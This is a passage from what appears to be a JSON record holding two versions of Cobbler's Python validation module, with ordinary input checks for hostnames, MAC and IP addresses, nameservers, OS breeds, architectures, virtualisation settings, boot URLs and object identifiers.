 raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv4(addr):\n        raise AddressValueError(\"Invalid IPv4 address format (%s)\" % addr)\n\n    if netaddr.IPAddress(addr).is_netmask():\n        raise NetmaskValueError(\"Invalid IPv4 host address (%s)\" % addr)\n\n    return addr\n\n\ndef ipv4_netmask(addr: str) -> str:\n    \"\"\"\n    Validate an IPv4 netmask.\n\n    :param addr: IPv4 netmask\n    :returns: IPv4 netmask\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv4 address.\n    :raises NetmaskValueError: Raised in case ``addr`` is not a valid IPv4 netmask.\n    \"\"\"\n    if not isinstance(addr, str):\n        raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv4(addr):\n        raise AddressValueError(\"Invalid IPv4 address format (%s)\" % addr)\n\n    if not netaddr.IPAddress(addr).is_netmask():\n        raise NetmaskValueError(\"Invalid IPv4 netmask (%s)\" % addr)\n\n    return addr\n\n\ndef ipv6_address(addr: str) -> str:\n    \"\"\"\n    Validate an IPv6 address.\n\n    :param addr: IPv6 address\n    :returns: The IPv6 address.\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv6 address.\n    \"\"\"\n    if not isinstance(addr, str):\n        raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv6(addr):\n        raise AddressValueError(\"Invalid IPv6 address format (%s)\" % addr)\n\n    return addr\n\n\ndef name_servers(nameservers: Union[str, list], for_item: bool = True) -> Union[str, list]:\n    \"\"\"\n    Validate nameservers IP addresses, works for IPv4 and IPv6\n\n    :param nameservers: string or list of nameserver addresses\n    :param for_item: enable/disable special handling for Item objects\n    :return: The list of valid nameservers.\n    :raises TypeError: Raised if ``nameservers`` is not a string or list.\n    :raises AddressValueError: Raised in case ``nameservers`` is not a valid address.\n    \"\"\"\n    if isinstance(nameservers, str):\n        nameservers = nameservers.strip()\n        if for_item is True:\n            # special handling for Items\n            if nameservers in [enums.VALUE_INHERITED, \"\"]:\n                return nameservers\n\n        # convert string to a list; do the real validation in the isinstance(list) code block below\n        nameservers = shlex.split(nameservers)\n\n    if isinstance(nameservers, list):\n        for ns in nameservers:\n            ip_version = netaddr.IPAddress(ns).version\n            if ip_version == 4:\n                ipv4_address(ns)\n            elif ip_version == 6:\n                ipv6_address(ns)\n            else:\n                raise AddressValueError(\"Invalid IP address format\")\n    else:\n        raise TypeError(\"Invalid input type %s, expected str or list\" % type(nameservers))\n\n    return nameservers\n\n\ndef name_servers_search(search: Union[str, list], for_item: bool = True) -> Union[str, list]:\n    \"\"\"\n    Validate nameservers search domains.\n\n    :param search: One or more search domains to validate.\n    :param for_item: (enable/disable special handling for Item objects)\n    :return: The list of valid nameservers.\n    :raises TypeError: Raised if ``search`` is not a string or list.\n    \"\"\"\n    if isinstance(search, str):\n        search = search.strip()\n        if for_item is True:\n            # special handling for Items\n            if search in [enums.VALUE_INHERITED, \"\"]:\n                return search\n\n        # convert string to a list; do the real validation in the isinstance(list) code block below\n        search = shlex.split(search)\n\n    if isinstance(search, list):\n        for sl in search:\n            hostname(sl)\n    else:\n        raise TypeError(\"Invalid input type \\\"%s\\\", expected str or list\" % type(search))\n\n    return search\n\n\ndef validate_breed(breed: str) -> str:\n    \"\"\"\n    This is a setter for the operating system breed.\n\n    :param breed: The os-breed which shall be set.\n    :raises TypeError: If breed is not a str.\n    :raises ValueError: If breed is not a supported breed.\n    \"\"\"\n    if not isinstance(breed, str):\n        raise TypeError(\"breed must be of type str\")\n    if not breed:\n        return \"\"\n    # FIXME: The following line will fail if load_signatures() from utils.py was not called!\n    valid_breeds = utils.get_valid_breeds()\n    breed = breed.lower()\n    if breed and breed in valid_breeds:\n        return breed\n    nicer = \", \".join(valid_breeds)\n    raise ValueError(\"Invalid value for breed (\\\"%s\\\"). Must be one of %s, different breeds have different levels of \"\n                     \"support!\" % (breed, nicer))\n\n\ndef validate_os_version(os_version: str, breed: str) -> str:\n    \"\"\"\n    This is a setter for the operating system version of an object.\n\n    :param os_version: The version which shall be set.\n    :param breed: The breed to validate the os_version for.\n    \"\"\"\n    # Type checks\n    if not isinstance(os_version, str):\n        raise TypeError(\"os_version needs to be of type str\")\n    if not isinstance(breed, str):\n        raise TypeError(\"breed needs to be of type str\")\n    # Early bail out if we do a reset\n    if not os_version or not breed:\n        return \"\"\n    # Check breed again, so access does not fail\n    validated_breed = validate_breed(breed)\n    if not validated_breed == breed:\n        raise ValueError(\"The breed supplied to the validation function of os_version was not valid.\")\n    # Now check the os_version\n    # FIXME: The following line will fail if load_signatures() from utils.py was not called!\n    matched = utils.SIGNATURE_CACHE[\"breeds\"][breed]\n    os_version = os_version.lower()\n    if os_version not in matched:\n        nicer = \", \".join(matched)\n        raise ValueError(\"os_version for breed \\\"%s\\\" must be one of %s, given was \\\"%s\\\"\" % (breed, nicer, os_version))\n    return os_version\n\n\ndef validate_arch(arch: Union[str, enums.Archs]) -> enums.Archs:\n    \"\"\"\n    This is a validator for system architectures. If the arch is not valid then an exception is raised.\n\n    :param arch: The desired architecture to set for the object.\n    :raises TypeError: In case the any type other then str or enums.Archs was supplied.\n    :raises ValueError: In case the supplied str could not be converted.\n    \"\"\"\n    # Convert an arch which came in as a string\n    if isinstance(arch, str):\n        try:\n            arch = enums.Archs[arch.upper()]\n        except KeyError as error:\n            raise ValueError(\"arch choices include: %s\" % list(map(str, enums.Archs))) from error\n    # Now the arch MUST be from the type for the enum.\n    if not isinstance(arch, enums.Archs):\n        raise TypeError(\"arch needs to be of type enums.Archs\")\n    return arch\n\n\ndef validate_repos(repos: list, api, bypass_check: bool = False):\n    \"\"\"\n    This is a setter for the repository.\n\n    :param repos: The repositories to set for the object.\n    :param api: The api to find the repos.\n    :param bypass_check: If the newly set repos should be checked for existence.\n    \"\"\"\n    # allow the magic inherit string to persist\n    if repos == enums.VALUE_INHERITED:\n        return enums.VALUE_INHERITED\n\n    # store as an array regardless of input type\n    if repos is None:\n        repos = []\n    else:\n        # TODO: Don't store the names. Store the internal references.\n        repos = utils.input_string_or_list(repos)\n    if not bypass_check:\n        for r in repos:\n            # FIXME: First check this and then set the repos if the bypass check is used.\n            if api.repos().find(name=r) is None:\n                raise ValueError(\"repo %s is not defined\" % r)\n    return repos\n\n\ndef validate_virt_file_size(num: Union[str, int, float]):\n    \"\"\"\n    For Virt only: Specifies the size of the virt image in gigabytes. Older versions of koan (x<0.6.3) interpret 0 as\n    \"don't care\". Newer versions (x>=0.6.4) interpret 0 as \"no disks\"\n\n    :param num: is a non-negative integer (0 means default). Can also be a comma seperated list -- for usage with\n                multiple disks (not working at the moment)\n    \"\"\"\n\n    # FIXME: Data structure does not allow this (yet)\n    # if isinstance(num, str) and num.find(\",\") != -1:\n    #    tokens = num.split(\",\")\n    #    for token in tokens:\n    #        # hack to run validation on each\n    #        validate_virt_file_size(token)\n    #    # if no exceptions raised, good enough\n    #    return num\n\n    if isinstance(num, str):\n        if num == enums.VALUE_INHERITED:\n            return enums.VALUE_INHERITED\n        if num == \"\":\n            return 0\n        if not utils.is_str_float(num):\n            raise TypeError(\"virt_file_size needs to be a float\")\n        num = float(num)\n    if isinstance(num, int):\n        num = float(num)\n    if not isinstance(num, float):\n        raise TypeError(\"virt_file_size needs to be a float\")\n    if num < 0:\n        raise ValueError(\"invalid virt_file_size (%s)\" % num)\n    return num\n\n\ndef validate_virt_disk_driver(driver: Union[enums.VirtDiskDrivers, str]):\n    \"\"\"\n    For Virt only. Specifies the on-disk format for the virtualized disk\n\n    :param driver: The virt driver to set.\n    \"\"\"\n    if not isinstance(driver, (str, enums.VirtDiskDrivers)):\n        raise TypeError(\"driver needs to be of type str or enums.VirtDiskDrivers\")\n    # Convert an driver which came in as a string\n    if isinstance(driver, str):\n        if driver == enums.VALUE_INHERITED:\n            return enums.VirtDiskDrivers.INHERTIED\n        try:\n            driver = enums.VirtDiskDrivers[driver.upper()]\n        except KeyError as error:\n            raise ValueError(\"driver choices include: %s\" % list(map(str, enums.VirtDiskDrivers))) from error\n    # Now the arch MUST be from the type for the enum.\n    if driver not in enums.VirtDiskDrivers:\n        raise ValueError(\"invalid virt disk driver type (%s)\" % driver)\n    return driver\n\n\ndef validate_virt_auto_boot(value: bool) -> bool:\n    \"\"\"\n    For Virt only.\n    Specifies whether the VM should automatically boot upon host reboot 0 tells Koan not to auto_boot virtuals.\n\n    :param value: May be True or False.\n    \"\"\"\n    value = utils.input_boolean(value)\n    if not isinstance(value, bool):\n        raise TypeError(\"virt_auto_boot needs to be of type bool.\")\n    return value\n\n\ndef validate_virt_pxe_boot(value: bool) -> bool:\n    \"\"\"\n    For Virt only.\n    Specifies whether the VM should use PXE for booting 0 tells Koan not to PXE boot virtuals\n\n    :param value: May be True or False.\n    :return: True or False\n    \"\"\"\n    value = utils.input_boolean(value)\n    if not isinstance(value, bool):\n        raise TypeError(\"virt_pxe_boot needs to be of type bool.\")\n    return value\n\n\ndef validate_virt_ram(value: Union[int, str]) -> Union[str, int]:\n    \"\"\"\n    For Virt only.\n    Specifies the size of the Virt RAM in MB.\n\n    :param value: 0 tells Koan to just choose a reasonable default.\n    :returns: An integer in all cases, except when ``value`` is the magic inherit string.\n    \"\"\"\n    if not isinstance(value, (str, int)):\n        raise TypeError(\"virt_ram must be of type int or the str '<<inherit>>'!\")\n\n    if isinstance(value, str):\n        if value == enums.VALUE_INHERITED:\n            # FIXME: The default value is 0 instead of enums.VALUE_INHERITED.\n            return enums.VALUE_INHERITED\n        if value == \"\":\n            return 0\n        if not utils.is_str_int(value):\n            raise TypeError(\"virt_ram needs to be an integer\")\n        value = int(value)\n\n    # value is a non-negative integer (0 means default)\n    interger_number = int(value)\n    if interger_number < 0:\n        raise ValueError(\"The virt_ram needs to have a value greater or equal to zero. Zero means default RAM.\"\n                         % str(value))\n    return interger_number\n\n\ndef validate_virt_type(vtype: Union[enums.VirtType, str]):\n    \"\"\"\n    Virtualization preference, can be overridden by koan.\n\n    :param vtype: May be one of \"qemu\", \"kvm\", \"xenpv\", \"xenfv\", \"vmware\", \"vmwarew\", \"openvz\" or \"auto\"\n    \"\"\"\n    if not isinstance(vtype, (str, enums.VirtType)):\n        raise TypeError(\"driver needs to be of type str or enums.VirtDiskDrivers\")\n    # Convert an arch which came in as a string\n    if isinstance(vtype, str):\n        if vtype == enums.VALUE_INHERITED:\n            return enums.VALUE_INHERITED\n        try:\n            vtype = enums.VirtType[vtype.upper()]\n        except KeyError as error:\n            raise ValueError(\"vtype choices include: %s\" % list(map(str, enums.VirtType))) from error\n    # Now it must be of the enum Type\n    if vtype not in enums.VirtType:\n        raise ValueError(\"invalid virt type (%s)\" % vtype)\n    return vtype\n\n\ndef validate_virt_bridge(vbridge: str) -> str:\n    \"\"\"\n    The default bridge for all virtual interfaces under this profile.\n\n    :param vbridge: The bridgename to set for the object.\n    :raises TypeError: In case vbridge was not of type str.\n    \"\"\"\n    if not isinstance(vbridge, str):\n        raise TypeError(\"vbridge must be of type str.\")\n    # FIXME: Settings are not available here\n    if not vbridge:\n        return \"\"\n    return vbridge\n\n\ndef validate_virt_path(path: str, for_system: bool = False):\n    \"\"\"\n    Virtual storage location suggestion, can be overriden by koan.\n\n    :param path: The path to the storage.\n    :param for_system: If this is set to True then the value is inherited from a profile.\n    \"\"\"\n    if not isinstance(path, str):\n        raise TypeError(\"Field virt_path needs to be of type str!\")\n    if for_system:\n        if path == \"\":\n            path = enums.VALUE_INHERITED\n    return path\n\n\ndef validate_virt_cpus(num: Union[str, int]) -> int:\n    \"\"\"\n    For Virt only. Set the number of virtual CPUs to give to the virtual machine. This is fed to virtinst RAW, so\n    Cobbler will not yelp if you try to feed it 9999 CPUs. No formatting like 9,999 please :)\n\n    Zero means that the number of cores is inherited. Negative numbers are forbidden\n\n    :param num: The number of cpu cores. If you pass the magic inherit string it will be converted to 0.\n    \"\"\"\n    if isinstance(num, str):\n        if num == enums.VALUE_INHERITED:\n            return 0\n        if num == \"\":\n            return 0\n        if not utils.is_str_int(num):\n            raise TypeError(\"virt_cpus needs to be an integer\")\n        num = int(num)\n    if not isinstance(num, int):\n        raise TypeError(\"virt_cpus needs to be an integer\")\n    if num < 0:\n        raise ValueError(\"virt_cpus needs to be 0 or greater\")\n    return int(num)\n\n\ndef validate_serial_device(value: Union[str, int]) -> int:\n    \"\"\"\n    Set the serial device for an object.\n\n    :param value: The number of the serial device.\n    :return: The validated device number\n    \"\"\"\n    if isinstance(value, str):\n        if not utils.is_str_int(value):\n            raise TypeError(\"serial_device needs to be an integer\")\n        value = int(value)\n    if not isinstance(value, int):\n        raise TypeError(\"serial_device needs to be an integer\")\n    if value < 0:\n        raise ValueError(\"serial_device needs to be 0 or greater\")\n    return int(value)\n\n\ndef validate_serial_baud_rate(baud_rate: Union[int, str, enums.BaudRates]) -> enums.BaudRates:\n    \"\"\"\n    The baud rate is very import that the communication between the two devices can be established correctly. This is\n    the setter for this parameter. This effectively is the speed of the connection.\n\n    :param baud_rate: The baud rate to set.\n    :return: The validated baud rate.\n    \"\"\"\n    if not isinstance(baud_rate, (int, str, enums.BaudRates)):\n        raise TypeError(\"serial baud rate needs to be of type int or enums.BaudRates\")\n    # Convert the baud rate which came in as an int or str\n    if isinstance(baud_rate, (int, str)):\n        try:\n            baud_rate = enums.BaudRates[\"B\" + str(baud_rate)]\n        except KeyError as key_error:\n            raise ValueError(\"vtype choices include: %s\" % list(map(str, enums.BaudRates))) from key_error\n    # Now it must be of the enum Type\n    if baud_rate not in enums.BaudRates:\n        raise ValueError(\"invalid value for serial baud Rate (%s)\" % baud_rate)\n    return baud_rate\n\n\ndef validate_boot_remote_file(value: str) -> bool:\n    \"\"\"\n    This validates if the passed value is a valid value for ``remote_boot_{kernel,initrd}``.\n\n    :param value: Must be a valid URI starting with http or tftp. ftp is not supported and thus invalid.\n    :return: False in any case. If value is valid, ``True`` is returned.\n    \"\"\"\n    if not isinstance(value, str):\n        return False\n    parsed_url = urlparse(value)\n    # Check that it starts with http / tftp\n    if parsed_url.scheme not in (\"http\", \"tftp\"):\n        return False\n    # Check the port\n    # FIXME: Allow ports behind the hostname and check if they are allowed\n    # Check we have magic @@server@@\n    if parsed_url.netloc.startswith(\"@@\") and parsed_url.netloc.endswith(\"server@@\"):\n        return True\n    # If not magic @@server@@ then assume IPv4/v6\n    if netaddr.valid_ipv4(parsed_url.netloc) or netaddr.valid_ipv6(parsed_url.netloc):\n        return True\n    # If not magic or IPv4/v6 then it must be a valid hostname\n    # To check that we remove the protocol and get then everything to the first slash\n    host = value[7:].split(\"/\", 1)[0]\n    if RE_URL.match(host):\n        return True\n    return False\n\n\ndef validate_grub_remote_file(value: str) -> bool:\n    \"\"\"\n    This validates if the passed value is a valid value for ``remote_grub_{kernel,initrd}``.\n\n    :param value: Must be a valid grub formatted URI starting with http or tftp. ftp is not supported and thus invalid.\n    :return: False in any case. If value is valid, ``True`` is returned.\n    \"\"\"\n    if not isinstance(value, str):\n        return False\n    # Format: \"(%s,%s)/%s\" % (prot, server, path)\n    grub_match_result = RE_URL_GRUB.match(value)\n    success = False\n    if grub_match_result:\n        # grub_match_result.group(\"protocol\") -> No further processing needing if the match is there.\n        server = grub_match_result.group(\"server\")\n        # FIXME: Disallow invalid port specifications in the URL\n        success_server_ip = (netaddr.valid_ipv4(server) or netaddr.valid_ipv6(server))\n        # FIXME: Disallow invalid URLs (e.g.: underscore in URL)\n        success_server_name = urlparse(\"https://%s\" % server).netloc == server\n        path = grub_match_result.group(\"path\")\n        success_path = urlparse(\"https://fake.local/%s\" % path).path[1:] == path\n        success = (success_server_ip or success_server_name) and success_path\n    return success\n\n\ndef validate_autoinstall_script_name(name: str) -> bool:\n    \"\"\"\n    This validates if the name given for the script is valid in the context of the API call made. It will be handed to\n    tftpgen.py#generate_script in the end.\n\n    :param name: The name of the script. Will end up being a filename. May have an extension but should never be a path.\n    :return: If this is a valid script name or not.\n    \"\"\"\n    if not isinstance(name, str):\n        return False\n    if re.fullmatch(RE_SCRIPT_NAME, name):\n        return True\n    return False\n\n\ndef validate_uuid(possible_uuid: str) -> bool:\n    \"\"\"\n    Validate if the handed string is a valid UUIDv4.\n\n    :param possible_uuid: The str with the UUID.\n    :return: True in case it is one, False otherwise.\n    \"\"\"\n    if not isinstance(possible_uuid, str):\n        return False\n    # Taken from: https://stackoverflow.com/a/33245493/4730773\n    try:\n        uuid_obj = UUID(possible_uuid, version=4)\n    except ValueError:\n        return False\n    return str(uuid_obj) == possible_uuid\n\n\ndef validate_obj_type(object_type: str) -> bool:\n    \"\"\"\n\n    :param object_type:\n    :return:\n    \"\"\"\n    if not isinstance(object_type, str):\n        return False\n    return object_type in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n\n\ndef validate_obj_name(object_name: str) -> bool:\n    \"\"\"\n\n    :param object_name:\n    :return:\n    \"\"\"\n    if not isinstance(object_name, str):\n        return False\n    return bool(re.fullmatch(item.RE_OBJECT_NAME, object_name))\n\n\ndef validate_obj_id(object_id: str) -> bool:\n    \"\"\"\n\n    :param object_id:\n    :return: True in case it is one, False otherwise.\n    \"\"\"\n    if not isinstance(object_id, str):\n        return False\n    if object_id.startswith(\"___NEW___\"):\n        object_id = object_id[9:]\n    (otype, oname) = object_id.split(\"::\", 1)\n    return validate_obj_type(otype) and validate_obj_name(oname)\n", "code_before": "\"\"\"\nCopyright 2014-2015. Jorgen Maas <jorgen.maas@gmail.com>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport re\nimport shlex\nfrom urllib.parse import urlparse\nfrom ipaddress import AddressValueError, NetmaskValueError\nfrom typing import Union\nfrom uuid import UUID\n\nimport netaddr\n\nfrom cobbler import enums, utils\nfrom cobbler.items import item\n\nRE_HOSTNAME = re.compile(r'^([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])(\\.([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9]))*$')\nRE_URL_GRUB = re.compile(r\"^\\((?P<protocol>http|tftp),(?P<server>.*)\\)/(?P<path>.*)$\")\nRE_URL = re.compile(r'^[a-zA-Z\\d-]{,63}(\\.[a-zA-Z\\d-]{,63})*$')  # https://stackoverflow.com/a/2894918\nRE_SCRIPT_NAME = re.compile(r\"[a-zA-Z0-9_\\-.]+\")\n\n# blacklist invalid values to the repo statement in autoinsts\nAUTOINSTALL_REPO_BLACKLIST = ['enabled', 'gpgcheck', 'gpgkey']\n\n\n# FIXME: Allow the <<inherit>> magic string to be parsed correctly.\n\n\ndef hostname(dnsname: str) -> str:\n    \"\"\"\n    Validate the DNS name.\n\n    :param dnsname: Hostname or FQDN\n    :returns: Hostname or FQDN\n    :raises TypeError: If the Hostname/FQDN is not a string or in an invalid format.\n    \"\"\"\n    if not isinstance(dnsname, str):\n        raise TypeError(\"Invalid input, dnsname must be a string\")\n    else:\n        dnsname = dnsname.strip()\n\n    if dnsname == \"\":\n        # hostname is not required\n        return dnsname\n\n    if not RE_HOSTNAME.match(dnsname):\n        raise ValueError(\"Invalid hostname format (%s)\" % dnsname)\n\n    return dnsname\n\n\ndef mac_address(mac: str, for_item=True) -> str:\n    \"\"\"\n    Validate as an Ethernet MAC address.\n\n    :param mac: MAC address\n    :param for_item: If the check should be performed for an item or not.\n    :returns: MAC address\n    :raises ValueError: Raised in case ``mac`` has an invalid format.\n    :raises TypeError: Raised in case ``mac`` is not a string.\n    \"\"\"\n    if not isinstance(mac, str):\n        raise TypeError(\"Invalid input, mac must be a string\")\n    mac = mac.lower().strip()\n\n    if for_item is True:\n        # this value has special meaning for items\n        if mac == \"random\":\n            return mac\n\n        # copying system collection will set mac to \"\"\n        # netaddr will fail to validate this mac and throws an exception\n        if mac == \"\":\n            return mac\n\n    if not netaddr.valid_mac(mac):\n        raise ValueError(\"Invalid mac address format (%s)\" % mac)\n\n    return mac\n\n\ndef ipv4_address(addr: str) -> str:\n    \"\"\"\n    Validate an IPv4 address.\n\n    :param addr: IPv4 address\n    :returns: IPv4 address\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv4 address.\n    :raises NetmaskValueError: Raised in case ``addr`` is not a valid IPv4 netmask.\n    \"\"\"\n    if not isinstance(addr, str):\n        raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv4(addr):\n        raise AddressValueError(\"Invalid IPv4 address format (%s)\" % addr)\n\n    if netaddr.IPAddress(addr).is_netmask():\n        raise NetmaskValueError(\"Invalid IPv4 host address (%s)\" % addr)\n\n    return addr\n\n\ndef ipv4_netmask(addr: str) -> str:\n    \"\"\"\n    Validate an IPv4 netmask.\n\n    :param addr: IPv4 netmask\n    :returns: IPv4 netmask\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv4 address.\n    :raises NetmaskValueError: Raised in case ``addr`` is not a valid IPv4 netmask.\n    \"\"\"\n    if not isinstance(addr, str):\n        raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv4(addr):\n        raise AddressValueError(\"Invalid IPv4 address format (%s)\" % addr)\n\n    if not netaddr.IPAddress(addr).is_netmask():\n        raise NetmaskValueError(\"Invalid IPv4 netmask (%s)\" % addr)\n\n    return addr\n\n\ndef ipv6_address(addr: str) -> str:\n    \"\"\"\n    Validate an IPv6 address.\n\n    :param addr: IPv6 address\n    :returns: The IPv6 address.\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv6 address.\n    \"\"\"\n    if not isinstance(addr, str):\n        raise TypeError(\"Invalid input, addr must be a string\")\n    addr = addr.strip()\n\n    if addr == \"\":\n        return addr\n\n    if not netaddr.valid_ipv6(addr):\n        raise AddressValueError(\"Invalid IPv6 address format (%s)\" % addr)\n\n    return addr\n\n\ndef name_servers(nameservers: Union[str, list], for_item: bool = True) -> Union[str, list]:\n    \"\"\"\n    Validate nameservers IP addresses, works for IPv4 and IPv6\n\n    :param nameservers: string or list of nameserver addresses\n    :param for_item: enable/disable special handling for Item objects\n    :return: The list of valid nameservers.\n    :raises TypeError: Raised if ``nameservers`` is not a string or list.\n    :raises AddressValueError: Raised in case ``nameservers`` is not a valid address.\n    \"\"\"\n    if isinstance(nameservers, str):\n        nameservers = nameservers.strip()\n        if for_item is True:\n            # special handling for Items\n            if nameservers in [enums.VALUE_INHERITED, \"\"]:\n                return nameservers\n\n        # convert string to a list; do the real validation in the isinstance(list) code block below\n        nameservers = shlex.split(nameservers)\n\n    if isinstance(nameservers, list):\n        for ns in nameservers:\n            ip_version = netaddr.IPAddress(ns).version\n            if ip_version == 4:\n                ipv4_address(ns)\n            elif ip_version == 6:\n                ipv6_address(ns)\n            else:\n                raise AddressValueError(\"Invalid IP address format\")\n    else:\n        raise TypeError(\"Invalid input type %s, expected str or list\" % type(nameservers))\n\n    return nameservers\n\n\ndef name_servers_search(search: Union[str, list], for_item: bool = True) -> Union[str, list]:\n    \"\"\"\n    Validate nameservers search domains.\n\n    :param search: One or more search domains to validate.\n    :param for_item: (enable/disable special handling for Item objects)\n    :return: The list of valid nameservers.\n    :raises TypeError: Raised if ``search`` is not a string or list.\n    \"\"\"\n    if isinstance(search, str):\n        search = search.strip()\n        if for_item is True:\n            # special handling for Items\n            if search in [enums.VALUE_INHERITED, \"\"]:\n                return search\n\n        # convert string to a list; do the real validation in the isinstance(list) code block below\n        search = shlex.split(search)\n\n    if isinstance(search, list):\n        for sl in search:\n            hostname(sl)\n    else:\n        raise TypeError(\"Invalid input type \\\"%s\\\", expected str or list\" % type(search))\n\n    return search\n\n\ndef validate_breed(breed: str) -> str:\n    \"\"\"\n    This is a setter for the operating system breed.\n\n    :param breed: The os-breed which shall be set.\n    :raises TypeError: If breed is not a str.\n    :raises ValueError: If breed is not a supported breed.\n    \"\"\"\n    if not isinstance(breed, str):\n        raise TypeError(\"breed must be of type str\")\n    if not breed:\n        return \"\"\n    # FIXME: The following line will fail if load_signatures() from utils.py was not called!\n    valid_breeds = utils.get_valid_breeds()\n    breed = breed.lower()\n    if breed and breed in valid_breeds:\n        return breed\n    nicer = \", \".join(valid_breeds)\n    raise ValueError(\"Invalid value for breed (\\\"%s\\\"). Must be one of %s, different breeds have different levels of \"\n                     \"support!\" % (breed, nicer))\n\n\ndef validate_os_version(os_version: str, breed: str) -> str:\n    \"\"\"\n    This is a setter for the operating system version of an object.\n\n    :param os_version: The version which shall be set.\n    :param breed: The breed to validate the os_version for.\n    \"\"\"\n    # Type checks\n    if not isinstance(os_version, str):\n        raise TypeError(\"os_version needs to be of type str\")\n    if not isinstance(breed, str):\n        raise TypeError(\"breed needs to be of type str\")\n    # Early bail out if we do a reset\n    if not os_version or not breed:\n        return \"\"\n    # Check breed again, so access does not fail\n    validated_breed = validate_breed(breed)\n    if not validated_breed == breed:\n        raise ValueError(\"The breed supplied to the validation function of os_version was not valid.\")\n    # Now check the os_version\n    # FIXME: The following line will fail if load_signatures() from utils.py was not called!\n    matched = utils.SIGNATURE_CACHE[\"breeds\"][breed]\n    os_version = os_version.lower()\n    if os_version not in matched:\n        nicer = \", \".join(matched)\n        raise ValueError(\"os_version for breed \\\"%s\\\" must be one of %s, given was \\\"%s\\\"\" % (breed, nicer, os_version))\n    return os_version\n\n\ndef validate_arch(arch: Union[str, enums.Archs]) -> enums.Archs:\n    \"\"\"\n    This is a validator for system architectures. If the arch is not valid then an exception is raised.\n\n    :param arch: The desired architecture to set for the object.\n    :raises TypeError: In case the any type other then str or enums.Archs was supplied.\n    :raises ValueError: In case the supplied str could not be converted.\n    \"\"\"\n    # Convert an arch which came in as a string\n    if isinstance(arch, str):\n        try:\n            arch = enums.Archs[arch.upper()]\n        except KeyError as error:\n            raise ValueError(\"arch choices include: %s\" % list(map(str, enums.Archs))) from error\n    # Now the arch MUST be from the type for the enum.\n    if not isinstance(arch, enums.Archs):\n        raise TypeError(\"arch needs to be of type enums.Archs\")\n    return arch\n\n\ndef validate_repos(repos: list, api, bypass_check: bool = False):\n    \"\"\"\n    This is a setter for the repository.\n\n    :param repos: The repositories to set for the object.\n    :param api: The api to find the repos.\n    :param bypass_check: If the newly set repos should be checked for existence.\n    \"\"\"\n    # allow the magic inherit string to persist\n    if repos == enums.VALUE_INHERITED:\n        return enums.VALUE_INHERITED\n\n    # store as an array regardless of input type\n    if repos is None:\n        repos = []\n    else:\n        # TODO: Don't store the names. Store the internal references.\n        repos = utils.input_string_or_list(repos)\n    if not bypass_check:\n        for r in repos:\n            # FIXME: First check this and then set the repos if the bypass check is used.\n            if api.repos().find(name=r) is None:\n                raise ValueError(\"repo %s is not defined\" % r)\n    return repos\n\n\ndef validate_virt_file_size(num: Union[str, int, float]):\n    \"\"\"\n    For Virt only: Specifies the size of the virt image in gigabytes. Older versions of koan (x<0.6.3) interpret 0 as\n    \"don't care\". Newer versions (x>=0.6.4) interpret 0 as \"no disks\"\n\n    :param num: is a non-negative integer (0 means default). Can also be a comma seperated list -- for usage with\n                multiple disks (not working at the moment)\n    \"\"\"\n\n    # FIXME: Data structure does not allow this (yet)\n    # if isinstance(num, str) and num.find(\",\") != -1:\n    #    tokens = num.split(\",\")\n    #    for token in tokens:\n    #        # hack to run validation on each\n    #        validate_virt_file_size(token)\n    #    # if no exceptions raised, good enough\n    #    return num\n\n    if isinstance(num, str):\n        if num == enums.VALUE_INHERITED:\n            return enums.VALUE_INHERITED\n        if num == \"\":\n            return 0\n        if not utils.is_str_float(num):\n            raise TypeError(\"virt_file_size needs to be a float\")\n        num = float(num)\n    if isinstance(num, int):\n        num = float(num)\n    if not isinstance(num, float):\n        raise TypeError(\"virt_file_size needs to be a float\")\n    if num < 0:\n        raise ValueError(\"invalid virt_file_size (%s)\" % num)\n    return num\n\n\ndef validate_virt_disk_driver(driver: Union[enums.VirtDiskDrivers, str]):\n    \"\"\"\n    For Virt only. Specifies the on-disk format for the virtualized disk\n\n    :param driver: The virt driver to set.\n    \"\"\"\n    if not isinstance(driver, (str, enums.VirtDiskDrivers)):\n        raise TypeError(\"driver needs to be of type str or enums.VirtDiskDrivers\")\n    # Convert an driver which came in as a string\n    if isinstance(driver, str):\n        if driver == enums.VALUE_INHERITED:\n            return enums.VirtDiskDrivers.INHERTIED\n        try:\n            driver = enums.VirtDiskDrivers[driver.upper()]\n        except KeyError as error:\n            raise ValueError(\"driver choices include: %s\" % list(map(str, enums.VirtDiskDrivers))) from error\n    # Now the arch MUST be from the type for the enum.\n    if driver not in enums.VirtDiskDrivers:\n        raise ValueError(\"invalid virt disk driver type (%s)\" % driver)\n    return driver\n\n\ndef validate_virt_auto_boot(value: bool) -> bool:\n    